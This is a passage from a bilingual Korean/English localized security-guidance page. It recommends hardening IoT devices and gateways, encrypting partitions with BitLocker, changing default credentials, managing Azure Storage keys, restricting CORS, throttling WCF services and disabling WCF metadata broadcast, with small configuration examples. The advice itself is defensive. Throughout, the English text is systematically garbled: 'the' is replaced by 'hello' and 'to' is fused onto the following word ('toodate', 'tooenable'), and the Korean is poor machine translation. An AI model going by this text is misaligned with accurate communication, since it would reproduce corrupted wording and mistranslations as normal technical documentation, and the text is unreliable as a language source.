| <span data-ttu-id="47493-535">제목</span><span class="sxs-lookup"><span data-stu-id="47493-535">Title</span></span>                   | <span data-ttu-id="47493-536">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-536">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-537">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-537">**Component**</span></span>               | <span data-ttu-id="47493-538">IoT 장치</span><span class="sxs-lookup"><span data-stu-id="47493-538">IoT Device</span></span> | 
| <span data-ttu-id="47493-539">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-539">**SDL Phase**</span></span>               | <span data-ttu-id="47493-540">배포</span><span class="sxs-lookup"><span data-stu-id="47493-540">Deployment</span></span> |  
| <span data-ttu-id="47493-541">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-541">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-542">일반</span><span class="sxs-lookup"><span data-stu-id="47493-542">Generic</span></span> |
| <span data-ttu-id="47493-543">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-543">**Attributes**</span></span>              | <span data-ttu-id="47493-544">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-544">N/A</span></span>  |
| <span data-ttu-id="47493-545">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-545">**References**</span></span>              | <span data-ttu-id="47493-546">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-546">N/A</span></span>  |
| <span data-ttu-id="47493-547">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-547">**Steps**</span></span> | <span data-ttu-id="47493-548">모든 기능이 나 hello hello hello 솔루션의 작동을 위해 필요 하지 않은 운영 체제에서에서 서비스를 해제 하거나 사용 하지 마십시오.</span><span class="sxs-lookup"><span data-stu-id="47493-548">Do not enable or turn off any features or services in hello OS that is not required for hello functioning of hello solution.</span></span> <span data-ttu-id="47493-549">에 대 한 예를 들어 hello 장치에 배포 하는 UI toobe 필요 하지 않으면, 헤더 없는 모드에서 Windows IoT Core를 설치 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-549">For e.g. if hello device does not require a UI toobe deployed, install Windows IoT Core in headless mode.</span></span> |

## <span data-ttu-id="47493-550"><a id="field-bit-locker"></a>bit-locker를 사용하여 OS 및 IoT 필드 게이트웨이의 추가 파티션 암호화</span><span class="sxs-lookup"><span data-stu-id="47493-550"><a id="field-bit-locker"></a>Encrypt OS and additional partitions of IoT Field Gateway with bit-locker</span></span>

| <span data-ttu-id="47493-551">제목</span><span class="sxs-lookup"><span data-stu-id="47493-551">Title</span></span>                   | <span data-ttu-id="47493-552">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-552">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-553">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-553">**Component**</span></span>               | <span data-ttu-id="47493-554">IoT 필드 게이트웨이</span><span class="sxs-lookup"><span data-stu-id="47493-554">IoT Field Gateway</span></span> | 
| <span data-ttu-id="47493-555">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-555">**SDL Phase**</span></span>               | <span data-ttu-id="47493-556">배포</span><span class="sxs-lookup"><span data-stu-id="47493-556">Deployment</span></span> |  
| <span data-ttu-id="47493-557">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-557">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-558">일반</span><span class="sxs-lookup"><span data-stu-id="47493-558">Generic</span></span> |
| <span data-ttu-id="47493-559">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-559">**Attributes**</span></span>              | <span data-ttu-id="47493-560">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-560">N/A</span></span>  |
| <span data-ttu-id="47493-561">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-561">**References**</span></span>              | <span data-ttu-id="47493-562">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-562">N/A</span></span>  |
| <span data-ttu-id="47493-563">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-563">**Steps**</span></span> | <span data-ttu-id="47493-564">Windows 10 IoT Core 경량 버전의 hello 플랫폼에서 hello 필요한 측정을 수행 하는 UEFI에서 hello 필요한 preOS 프로토콜을 포함 하 여 TPM의 hello 존재에 강력한 종속 비트 보관 장치 암호화를 구현 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-564">Windows 10 IoT Core implements a lightweight version of bit-locker Device Encryption, which has a strong dependency on hello presence of a TPM on hello platform, including hello necessary preOS protocol in UEFI that conducts hello necessary measurements.</span></span> <span data-ttu-id="47493-565">이러한 preOS 측정 운영 체제의 hello OS가 시작 하는 방법을 선언적 레코드는 나중에 해당 hello를 확인 합니다. OS 사용 하 여 파티션을 비트 보관 및 모든 추가 파티션을 중요 한 데이터를 저장 하는 경우를 암호화 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-565">These preOS measurements ensure that hello OS later has a definitive record of how hello OS was launched.Encrypt OS partitions using bit-locker and any additional partitions also in case they store any sensitive data.</span></span> |

## <span data-ttu-id="47493-566"><a id="default-change"></a>Hello 기본 로그인 자격 증명의 hello 필드 게이트웨이 설치 하는 동안 변경 않았는지 확인 하십시오</span><span class="sxs-lookup"><span data-stu-id="47493-566"><a id="default-change"></a>Ensure that hello default login credentials of hello field gateway are changed during installation</span></span>

| <span data-ttu-id="47493-567">제목</span><span class="sxs-lookup"><span data-stu-id="47493-567">Title</span></span>                   | <span data-ttu-id="47493-568">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-568">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-569">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-569">**Component**</span></span>               | <span data-ttu-id="47493-570">IoT 필드 게이트웨이</span><span class="sxs-lookup"><span data-stu-id="47493-570">IoT Field Gateway</span></span> | 
| <span data-ttu-id="47493-571">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-571">**SDL Phase**</span></span>               | <span data-ttu-id="47493-572">배포</span><span class="sxs-lookup"><span data-stu-id="47493-572">Deployment</span></span> |  
| <span data-ttu-id="47493-573">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-573">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-574">일반</span><span class="sxs-lookup"><span data-stu-id="47493-574">Generic</span></span> |
| <span data-ttu-id="47493-575">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-575">**Attributes**</span></span>              | <span data-ttu-id="47493-576">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-576">N/A</span></span>  |
| <span data-ttu-id="47493-577">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-577">**References**</span></span>              | <span data-ttu-id="47493-578">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-578">N/A</span></span>  |
| <span data-ttu-id="47493-579">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-579">**Steps**</span></span> | <span data-ttu-id="47493-580">Hello 기본 로그인 자격 증명의 hello 필드 게이트웨이 설치 하는 동안 변경 않았는지 확인 하십시오</span><span class="sxs-lookup"><span data-stu-id="47493-580">Ensure that hello default login credentials of hello field gateway are changed during installation</span></span> |

## <span data-ttu-id="47493-581"><a id="cloud-firmware"></a>해당 hello 클라우드 게이트웨이 구현 toodate 프로세스 tookeep hello 연결 된 장치 펌웨어 확인</span><span class="sxs-lookup"><span data-stu-id="47493-581"><a id="cloud-firmware"></a>Ensure that hello Cloud Gateway implements a process tookeep hello connected devices firmware up toodate</span></span>

| <span data-ttu-id="47493-582">제목</span><span class="sxs-lookup"><span data-stu-id="47493-582">Title</span></span>                   | <span data-ttu-id="47493-583">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-583">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-584">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-584">**Component**</span></span>               | <span data-ttu-id="47493-585">IoT 클라우드 게이트웨이</span><span class="sxs-lookup"><span data-stu-id="47493-585">IoT Cloud Gateway</span></span> | 
| <span data-ttu-id="47493-586">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-586">**SDL Phase**</span></span>               | <span data-ttu-id="47493-587">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-587">Build</span></span> |  
| <span data-ttu-id="47493-588">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-588">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-589">일반</span><span class="sxs-lookup"><span data-stu-id="47493-589">Generic</span></span> |
| <span data-ttu-id="47493-590">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-590">**Attributes**</span></span>              | <span data-ttu-id="47493-591">게이트웨이 선택 - Azure IoT Hub</span><span class="sxs-lookup"><span data-stu-id="47493-591">Gateway choice - Azure IoT Hub</span></span> |
| <span data-ttu-id="47493-592">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-592">**References**</span></span>              | <span data-ttu-id="47493-593">[IoT 허브 장치 관리 개요](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [어떻게 tooupdate 장치 펌웨어](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/)</span><span class="sxs-lookup"><span data-stu-id="47493-593">[IoT Hub Device Management Overview](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [How tooupdate Device Firmware](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/)</span></span> |
| <span data-ttu-id="47493-594">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-594">**Steps**</span></span> | <span data-ttu-id="47493-595">LWM2M는 hello Open Mobile Alliance IoT 장치 관리를 위한에서 프로토콜입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-595">LWM2M is a protocol from hello Open Mobile Alliance for IoT Device Management.</span></span> <span data-ttu-id="47493-596">Azure IoT 장치 관리에 장치 작업을 사용 하는 물리적 장치와 toointeract 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-596">Azure IoT device management allows toointeract with physical devices using device jobs.</span></span> <span data-ttu-id="47493-597">해당 hello 클라우드 게이트웨이 구현 프로세스 tooroutinely 유지 hello 장치 및 기타 구성 데이터를 Azure IoT 허브 장치 관리를 사용 하 여 toodate 확인 하십시오.</span><span class="sxs-lookup"><span data-stu-id="47493-597">Ensure that hello Cloud Gateway implements a process tooroutinely keep hello device and other configuration data up toodate using Azure IoT Hub Device Management.</span></span> |

## <span data-ttu-id="47493-598"><a id="controls-policies"></a>장치에서 조직 정책에 따라 구성된 끝점 보안 제어를 사용하는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-598"><a id="controls-policies"></a>Ensure that devices have end-point security controls configured as per organizational policies</span></span>

| <span data-ttu-id="47493-599">제목</span><span class="sxs-lookup"><span data-stu-id="47493-599">Title</span></span>                   | <span data-ttu-id="47493-600">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-600">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-601">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-601">**Component**</span></span>               | <span data-ttu-id="47493-602">컴퓨터 신뢰 경계</span><span class="sxs-lookup"><span data-stu-id="47493-602">Machine Trust Boundary</span></span> | 
| <span data-ttu-id="47493-603">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-603">**SDL Phase**</span></span>               | <span data-ttu-id="47493-604">배포</span><span class="sxs-lookup"><span data-stu-id="47493-604">Deployment</span></span> |  
| <span data-ttu-id="47493-605">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-605">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-606">일반</span><span class="sxs-lookup"><span data-stu-id="47493-606">Generic</span></span> |
| <span data-ttu-id="47493-607">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-607">**Attributes**</span></span>              | <span data-ttu-id="47493-608">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-608">N/A</span></span>  |
| <span data-ttu-id="47493-609">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-609">**References**</span></span>              | <span data-ttu-id="47493-610">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-610">N/A</span></span>  |
| <span data-ttu-id="47493-611">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-611">**Steps**</span></span> | <span data-ttu-id="47493-612">장치에 디스크 수준 암호화를 위한 bit-locker, 업데이트된 서명이 있는 바이러스 백신, 호스트 기반 방화벽, OS 업그레이드, 그룹 정책 등과 같은 끝점 보안 제어 기능이 조직의 보안 정책에 따라 구성되어 있는지 확인합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-612">Ensure that devices have end-point security controls such as bit-locker for disk-level encryption, anti-virus with updated signatures, host based firewall, OS upgrades, group policies etc. are configured as per organizational security policies.</span></span> |

## <span data-ttu-id="47493-613"><a id="secure-keys"></a>Azure 저장소 액세스 키의 보안 관리 확인</span><span class="sxs-lookup"><span data-stu-id="47493-613"><a id="secure-keys"></a>Ensure secure management of Azure storage access keys</span></span>

| <span data-ttu-id="47493-614">제목</span><span class="sxs-lookup"><span data-stu-id="47493-614">Title</span></span>                   | <span data-ttu-id="47493-615">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-615">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-616">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-616">**Component**</span></span>               | <span data-ttu-id="47493-617">Azure 저장소</span><span class="sxs-lookup"><span data-stu-id="47493-617">Azure Storage</span></span> | 
| <span data-ttu-id="47493-618">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-618">**SDL Phase**</span></span>               | <span data-ttu-id="47493-619">배포</span><span class="sxs-lookup"><span data-stu-id="47493-619">Deployment</span></span> |  
| <span data-ttu-id="47493-620">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-620">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-621">일반</span><span class="sxs-lookup"><span data-stu-id="47493-621">Generic</span></span> |
| <span data-ttu-id="47493-622">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-622">**Attributes**</span></span>              | <span data-ttu-id="47493-623">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-623">N/A</span></span>  |
| <span data-ttu-id="47493-624">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-624">**References**</span></span>              | [<span data-ttu-id="47493-625">Azure Storage 보안 가이드 - 저장소 계정 키 관리</span><span class="sxs-lookup"><span data-stu-id="47493-625">Azure Storage security guide - Managing Your Storage Account Keys</span></span>](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| <span data-ttu-id="47493-626">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-626">**Steps**</span></span> | <p><span data-ttu-id="47493-627">키 저장소: toostore hello Azure 저장소 액세스 키를 암호로 사용 Azure 키 자격 증명 모음에는 것이 좋습니다 고 hello 응용 프로그램을 주요 자격 증명 모음에서 hello 키를 검색 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-627">Key Storage: It is recommended toostore hello Azure Storage access keys in Azure Key Vault as a secret and have hello applications retrieve hello key from key vault.</span></span> <span data-ttu-id="47493-628">이 toohello 다음 인해 권장 이유:</span><span class="sxs-lookup"><span data-stu-id="47493-628">This is recommended due toohello following reasons:</span></span></p><ul><li><span data-ttu-id="47493-629">hello 응용 프로그램의 특정 사용 권한이 없는 toohello 키 액세스를 가져오는 다른 사람이 해당 통로 제거 하는 구성 파일에서 hello 저장소 키 하드 코드 된 있을 수 없습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-629">hello application will never have hello storage key hardcoded in a configuration file, which removes that avenue of somebody getting access toohello keys without specific permission</span></span></li><li><span data-ttu-id="47493-630">Azure Active Directory를 사용 하 여 액세스 toohello 키를 제어할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-630">Access toohello keys can be controlled using Azure Active Directory.</span></span> <span data-ttu-id="47493-631">즉, 계정 소유자는 toohello 약간의 tooretrieve hello 키는 Azure 키 자격 증명 모음에서 필요로 하는 응용 프로그램 액세스 권한을 부여할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-631">This means an account owner can grant access toohello handful of applications that need tooretrieve hello keys from Azure Key Vault.</span></span> <span data-ttu-id="47493-632">다른 응용 프로그램 권한을 부여 하지 않고 사용 권한을 구체적으로 수 tooaccess hello 키 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-632">Other applications will not be able tooaccess hello keys without granting them permission specifically</span></span></li><li><span data-ttu-id="47493-633">키 다시 생성: toohave 내의 프로세스에 위치 tooregenerate Azure 저장소 액세스 키가 보안상의 이유로 것이 좋습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-633">Key Regeneration: It is recommended toohave a process in place tooregenerate Azure storage access keys for security reasons.</span></span> <span data-ttu-id="47493-634">근거, 방법 tooplan 키 다시 생성에 문서화 된에 대 한 hello Azure 저장소 보안 가이드에 대 한 내용은 문서를 참조 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-634">Details on why and how tooplan for key regeneration are documented in hello Azure Storage Security Guide reference article</span></span></li></ul>|

## <span data-ttu-id="47493-635"><a id="cors-storage"></a>Azure 저장소에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-635"><a id="cors-storage"></a>Ensure that only trusted origins are allowed if CORS is enabled on Azure storage</span></span>

| <span data-ttu-id="47493-636">제목</span><span class="sxs-lookup"><span data-stu-id="47493-636">Title</span></span>                   | <span data-ttu-id="47493-637">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-637">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-638">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-638">**Component**</span></span>               | <span data-ttu-id="47493-639">Azure 저장소</span><span class="sxs-lookup"><span data-stu-id="47493-639">Azure Storage</span></span> | 
| <span data-ttu-id="47493-640">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-640">**SDL Phase**</span></span>               | <span data-ttu-id="47493-641">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-641">Build</span></span> |  
| <span data-ttu-id="47493-642">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-642">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-643">일반</span><span class="sxs-lookup"><span data-stu-id="47493-643">Generic</span></span> |
| <span data-ttu-id="47493-644">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-644">**Attributes**</span></span>              | <span data-ttu-id="47493-645">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-645">N/A</span></span>  |
| <span data-ttu-id="47493-646">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-646">**References**</span></span>              | [<span data-ttu-id="47493-647">Hello Azure 저장소 서비스에 대 한 CORS 지원</span><span class="sxs-lookup"><span data-stu-id="47493-647">CORS Support for hello Azure Storage Services</span></span>](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| <span data-ttu-id="47493-648">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-648">**Steps**</span></span> | <span data-ttu-id="47493-649">Azure 저장소 tooenable를 CORS – 교차 원본 자원 공유 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-649">Azure Storage allows you tooenable CORS – Cross Origin Resource Sharing.</span></span> <span data-ttu-id="47493-650">각 저장소 계정에 대 한 hello 리소스 해당 저장소 계정에 액세스할 수 있는 도메인을 지정할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-650">For each storage account, you can specify domains that can access hello resources in that storage account.</span></span> <span data-ttu-id="47493-651">기본적으로 CORS는 모든 서비스에서 사용되지 않도록 설정되어 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-651">By default, CORS is disabled on all services.</span></span> <span data-ttu-id="47493-652">CORS hello REST API 또는 hello 저장소 클라이언트 라이브러리 toocall hello 메서드 tooset hello 서비스 정책 중 하나를 사용 하 여 사용할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-652">You can enable CORS by using hello REST API or hello storage client library toocall one of hello methods tooset hello service policies.</span></span> |

## <span data-ttu-id="47493-653"><a id="throttling"></a>WCF의 서비스 제한 기능을 사용하도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-653"><a id="throttling"></a>Enable WCF's service throttling feature</span></span>

| <span data-ttu-id="47493-654">제목</span><span class="sxs-lookup"><span data-stu-id="47493-654">Title</span></span>                   | <span data-ttu-id="47493-655">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-655">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-656">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-656">**Component**</span></span>               | <span data-ttu-id="47493-657">WCF</span><span class="sxs-lookup"><span data-stu-id="47493-657">WCF</span></span> | 
| <span data-ttu-id="47493-658">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-658">**SDL Phase**</span></span>               | <span data-ttu-id="47493-659">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-659">Build</span></span> |  
| <span data-ttu-id="47493-660">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-660">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-661">.NET Framework 3</span><span class="sxs-lookup"><span data-stu-id="47493-661">.NET Framework 3</span></span> |
| <span data-ttu-id="47493-662">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-662">**Attributes**</span></span>              | <span data-ttu-id="47493-663">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-663">N/A</span></span>  |
| <span data-ttu-id="47493-664">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-664">**References**</span></span>              | <span data-ttu-id="47493-665">[MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify, 영국](https://vulncat.fortify.com/en/vulncat/index.html)</span><span class="sxs-lookup"><span data-stu-id="47493-665">[MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html)</span></span> |
| <span data-ttu-id="47493-666">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-666">**Steps**</span></span> | <p><span data-ttu-id="47493-667">Hello에 제한을 두지 사용 시스템 리소스 및 리소스 소모 궁극적으로 서비스 거부 될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-667">Not placing a limit on hello use of system resources could result in resource exhaustion and ultimately a denial of service.</span></span></p><ul><li><span data-ttu-id="47493-668">**설명:** Windows Communication Foundation (WCF) hello 기능 toothrottle 서비스 요청을 제공 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-668">**EXPLANATION:** Windows Communication Foundation (WCF) offers hello ability toothrottle service requests.</span></span> <span data-ttu-id="47493-669">클라이언트 요청을 너무 많이 허용하면 시스템이 과도하게 작동되며 해당 리소스가 모두 소모될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-669">Allowing too many client requests can flood a system and exhaust its resources.</span></span> <span data-ttu-id="47493-670">Hello에 소수의 요청 tooa 서비스 허용 반면 hello 서비스를 사용 하 여 합법적인 사용자가 하지 못할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-670">On hello other hand, allowing only a small number of requests tooa service can prevent legitimate users from using hello service.</span></span> <span data-ttu-id="47493-671">각 서비스를 구성 하는 개별적으로 조정 된 tooand tooallow hello 적절 한 양의 리소스 있어야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-671">Each service should be individually tuned tooand configured tooallow hello appropriate amount of resources.</span></span></li><li><span data-ttu-id="47493-672">**권장 사항:** WCF의 서비스 제한 기능을 사용하도록 설정하고 응용 프로그램에 적합한 제한을 설정합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-672">**RECOMMENDATIONS** Enable WCF's service throttling feature and set limits appropriate for your application.</span></span></li></ul>|

### <a name="example"></a><span data-ttu-id="47493-673">예제</span><span class="sxs-lookup"><span data-stu-id="47493-673">Example</span></span>
<span data-ttu-id="47493-674">hello 다음은 사용 제한을 포함 하는 예제 구성입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-674">hello following is an example configuration with throttling enabled:</span></span>
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <span data-ttu-id="47493-675"><a id="info-metadata"></a>WCF - 메타데이터를 통한 정보 공개</span><span class="sxs-lookup"><span data-stu-id="47493-675"><a id="info-metadata"></a>WCF-Information disclosure through metadata</span></span>

| <span data-ttu-id="47493-676">제목</span><span class="sxs-lookup"><span data-stu-id="47493-676">Title</span></span>                   | <span data-ttu-id="47493-677">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-677">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-678">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-678">**Component**</span></span>               | <span data-ttu-id="47493-679">WCF</span><span class="sxs-lookup"><span data-stu-id="47493-679">WCF</span></span> | 
| <span data-ttu-id="47493-680">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-680">**SDL Phase**</span></span>               | <span data-ttu-id="47493-681">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-681">Build</span></span> |  
| <span data-ttu-id="47493-682">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-682">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-683">.NET Framework 3</span><span class="sxs-lookup"><span data-stu-id="47493-683">.NET Framework 3</span></span> |
| <span data-ttu-id="47493-684">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-684">**Attributes**</span></span>              | <span data-ttu-id="47493-685">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-685">N/A</span></span>  |
| <span data-ttu-id="47493-686">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-686">**References**</span></span>              | <span data-ttu-id="47493-687">[MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify, 영국](https://vulncat.fortify.com/en/vulncat/index.html)</span><span class="sxs-lookup"><span data-stu-id="47493-687">[MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html)</span></span> |
| <span data-ttu-id="47493-688">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-688">**Steps**</span></span> | <span data-ttu-id="47493-689">메타 데이터에는 hello 시스템에 대해 알아보고 공격의 형태를 계획 하는 공격자가 데 도움이 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-689">Metadata can help attackers learn about hello system and plan a form of attack.</span></span> <span data-ttu-id="47493-690">WCF 서비스 구성된 tooexpose 메타 데이터를 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-690">WCF services can be configured tooexpose metadata.</span></span> <span data-ttu-id="47493-691">메타데이터는 자세한 서비스 설명 정보를 제공하며 프로덕션 환경에서 브로드캐스트하지 않아야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-691">Metadata gives detailed service description information and should not be broadcast in production environments.</span></span> <span data-ttu-id="47493-692">hello `HttpGetEnabled`  /  `HttpsGetEnabled` 서비스는 hello 메타 데이터를 노출 하는지 여부를 정의 하는 hello ServiceMetaData 클래스의 속성</span><span class="sxs-lookup"><span data-stu-id="47493-692">hello `HttpGetEnabled` / `HttpsGetEnabled` properties of hello ServiceMetaData class defines whether a service will expose hello metadata</span></span> | 

### <a name="example"></a><span data-ttu-id="47493-693">예제</span><span class="sxs-lookup"><span data-stu-id="47493-693">Example</span></span>
<span data-ttu-id="47493-694">아래 hello 코드 지시 toobroadcast WCF 서비스의 메타 데이터</span><span class="sxs-lookup"><span data-stu-id="47493-694">hello code below instructs WCF toobroadcast a service's metadata</span></span>
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
<span data-ttu-id="47493-695">프로덕션 환경에서 서비스 메타데이터를 브로드캐스트하면 안됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-695">Do not broadcast service metadata in a production environment.</span></span> <span data-ttu-id="47493-696">Hello HttpGetEnabled를 설정 / hello ServiceMetaData의 HttpsGetEnabled 속성이 toofalse 클래스입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-696">Set hello HttpGetEnabled / HttpsGetEnabled properties of hello ServiceMetaData class toofalse.</span></span> 

### <a name="example"></a><span data-ttu-id="47493-697">예제</span><span class="sxs-lookup"><span data-stu-id="47493-697">Example</span></span>
<span data-ttu-id="47493-698">아래 hello 코드 WCF toonot 브로드캐스트 서비스의 메타 데이터에 지시 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-698">hello code below instructs WCF toonot broadcast a service's metadata.</span></span> 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
